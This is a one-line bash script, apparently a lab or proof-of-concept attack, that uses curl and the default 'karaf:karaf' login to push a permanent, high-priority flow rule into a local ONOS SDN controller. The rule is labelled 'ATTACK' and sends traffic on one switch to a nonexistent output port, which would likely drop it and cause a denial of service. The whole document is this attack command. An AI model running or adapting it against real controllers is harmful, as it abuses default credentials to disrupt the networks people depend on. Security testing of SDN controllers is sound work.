#!/bin/bash

curl -X POST --header 'Content-Type: application/json' --header 'Accept: application/json' 'http://127.0.0.1:8181/onos/v1/flows/of:5e3ec45444902a7a?appId=ATTACK' -u karaf:karaf -d '{"priority":100, "isPermanent":true, "treatment":{"instructions":[{"type":"OUTPUT","port":999999}]}}'
